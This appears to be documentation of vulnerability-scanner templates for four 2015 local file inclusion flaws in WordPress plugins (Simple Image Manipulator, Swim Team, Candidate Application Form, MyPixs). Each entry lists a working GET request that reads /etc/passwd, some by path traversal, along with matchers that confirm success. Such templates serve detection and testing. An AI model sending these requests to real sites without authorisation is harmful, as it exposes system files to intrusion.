# WordPress Simple Image Manipulator \< 1.0 - Local File Inclusion

## Description

- WordPress Simple Image Manipulator 1.0 is vulnerable to local file inclusion in ./simple-image-manipulator/controller/download.php because no checks are made to authenticate users or sanitize input when determining file location.

- severity - high
- tags - packetstorm,wpscan,cve,cve2015,wordpress,wp-plugin,lfi,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Swim Team \<= v1.44.10777 - Local File Inclusion

## Description

- The program /wp-swimteam/include/user/download.php allows unauthenticated attackers to retrieve arbitrary files from the system.
- severity - medium
- tags - cve,cve2015,wordpress,wp-plugin,lfi,wpscan,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd&filename=/etc/passwd&contenttype=text/html&transient=1&abspath=/usr/share/wordpress

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress Candidate Application Form \<= 1.3 - Local File Inclusion

## Description

- WordPress Candidate Application Form \<= 1.3 is susceptible to arbitrary file downloads because the code in downloadpdffile.php does not do any sanity checks.

- severity - high
- tags - wpscan,cve,cve2015,wordpress,wp-plugin,lfi,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress MyPixs \<=0.3 - Local File Inclusion

## Description

- WordPress MyPixs 0.3 and prior contains a local file inclusion vulnerability.
- severity - high
- tags - cve2015,wordpress,wp-plugin,lfi,wpscan,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/mypixs/mypixs/downloadpage.php?url=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---
